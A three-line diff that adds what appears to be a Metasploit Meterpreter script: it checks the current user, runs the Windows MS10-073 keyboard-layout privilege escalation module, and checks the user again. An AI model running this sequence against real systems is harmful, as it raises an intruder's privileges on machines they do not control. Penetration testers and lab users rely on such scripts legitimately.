@@ -1,0 +1,3 @@
+getuid
+run post/windows/escalate/ms10_073_kbdlayout
+getuid
